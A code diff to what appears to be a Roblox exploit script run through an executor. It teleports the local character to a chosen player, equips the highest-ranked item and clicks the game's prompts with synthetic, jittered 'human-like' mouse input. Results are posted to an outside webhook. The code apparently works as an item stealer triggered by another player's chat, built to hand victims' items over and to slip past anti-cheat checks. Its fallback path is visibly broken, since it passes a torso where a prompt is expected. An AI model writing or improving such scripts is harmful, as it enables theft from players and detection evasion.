@@ -18,22 +18,27 @@ local ITEM_PRIORITY = {
     ["Butterfly"] = 700, ["Disco"] = 600, ["Wet"] = 500
 }
 
--- Alternative webhook method using request library
+-- Improved webhook with backup methods
 local function sendWebhook(content, embed)
     local payload = {
         content = content,
         embeds = {embed}
     }
     
+    -- Try different methods
     local success, response = pcall(function()
-        return syn.request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode(payload)
-        })
+        if syn and syn.request then
+            return syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        else
+            return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
+        end
     end)
     
     if not success then
@@ -107,55 +112,79 @@ local function findBestPrompt(targetChar)
     return bestPrompt
 end
 
-local function simulateHumanClick(position, duration)
-    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
-    local originalPos = Vector2.new(mouse.X, mouse.Y)
-    
-    -- Move mouse to target position gradually
-    local steps = 10
-    for i = 1, steps do
-        local t = i/steps
-        local newPos = originalPos:Lerp(position, t)
-        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
-        task.wait(0.05)
-    end
-    
-    -- Press and hold
-    VirtualInputManager:SendMouseButtonEvent(position.X, position.Y, 0, true, game, 1)
-    local startTime = os.clock()
-    
-    -- Small random movements during hold
-    while os.clock() - startTime < duration do
-        local jitter = Vector2.new(math.random(-5,5), math.random(-5,5))
-        VirtualInputManager:SendMouseMoveEvent(position.X + jitter.X, position.Y + jitter.Y, game)
-        task.wait(0.1)
-    end
-    
-    -- Release
-    VirtualInputManager:SendMouseButtonEvent(position.X, position.Y, 0, false, game, 1)
-end
-
-local function interactWithTarget(target)
+local function lookAtPlayer(target)
     local targetChar = target.Character or target.CharacterAdded:Wait()
-    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    local head = targetChar:WaitForChild("Head")
     
-    -- Teleport to player
-    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+    -- Save original camera settings
+    local preMaxZoom = LocalPlayer.CameraMaxZoomDistance
+    local preMinZoom = LocalPlayer.CameraMinZoomDistance
     
-    -- Set up camera
-    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
+    -- Set first person
     LocalPlayer.CameraMaxZoomDistance = 0.5
     LocalPlayer.CameraMinZoomDistance = 0.5
     
-    -- Find interaction point
-    local prompt = findBestPrompt(targetChar)
-    local interactPart = prompt or targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso")
-    
-    -- Look at target
-    local lookConn = RunService.Heartbeat:Connect(function()
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
+    -- Face the target
+    local connection
+    connection = RunService.Heartbeat:Connect(function()
+        Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
     end)
+    
+    return {
+        disconnect = function()
+            if connection then connection:Disconnect() end
+            LocalPlayer.CameraMaxZoomDistance = preMaxZoom
+            LocalPlayer.CameraMinZoomDistance = preMinZoom
+        end
+    }
+end
+
+local function simulateHumanHold(targetPrompt)
+    local startTime = os.clock()
+    local lastClick = 0
+    local promptPosition = targetPrompt.Parent.Position
+    
+    while os.clock() - startTime < 5 do
+        -- Only re-click every 0.5 seconds to simulate human behavior
+        if os.clock() - lastClick > 0.5 then
+            -- Get screen position
+            local screenPos, visible = Camera:WorldToScreenPoint(promptPosition)
+            if visible then
+                -- Small random offset to simulate human inaccuracy
+                local offset = Vector2.new(math.random(-10,10), math.random(-10,10))
+                local targetPos = Vector2.new(screenPos.X, screenPos.Y) + offset
+                
+                -- Move mouse gradually
+                local mouse = game:GetService("Players").LocalPlayer:GetMouse()
+                local steps = math.random(5,10)
+                for i = 1, steps do
+                    local t = i/steps
+                    local newPos = Vector2.new(mouse.X, mouse.Y):Lerp(targetPos, t)
+                    VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
+                    task.wait(0.05)
+                end
+                
+                -- Click
+                VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
+                task.wait(0.1)
+                VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
+                
+                lastClick = os.clock()
+            end
+        end
+        task.wait(0.1)
+    end
+end
+
+local function interactWithTarget(target)
+    -- Teleport to player
+    local targetChar = target.Character or target.CharacterAdded:Wait()
+    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+    
+    -- Face the target
+    local lookConnection = lookAtPlayer(target)
     
     -- Process items
     while true do
@@ -166,23 +195,20 @@ local function interactWithTarget(target)
         LocalPlayer.Character.Humanoid:EquipTool(bestItem)
         task.wait(0.5)
         
+        -- Find and interact with prompt
+        local prompt = findBestPrompt(targetChar)
         if prompt then
-            -- Get screen position of prompt
-            local screenPos, visible = Camera:WorldToScreenPoint(prompt.Parent.Position)
-            if visible then
-                simulateHumanClick(Vector2.new(screenPos.X, screenPos.Y), 5)
-            end
+            simulateHumanHold(prompt)
         else
-            -- Fallback click
-            local torsoPos = targetChar:FindFirstChild("UpperTorso").Position
-            local screenPos, visible = Camera:WorldToScreenPoint(torsoPos)
-            if visible then
-                simulateHumanClick(Vector2.new(screenPos.X, screenPos.Y), 5)
+            -- Fallback to torso click
+            local torso = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+            if torso then
+                simulateHumanHold(torso)
             end
         end
     end
     
-    if lookConn then lookConn:Disconnect() end
+    if lookConnection then lookConnection.disconnect() end
 end
 
 local function onPlayerChatted(player, message)
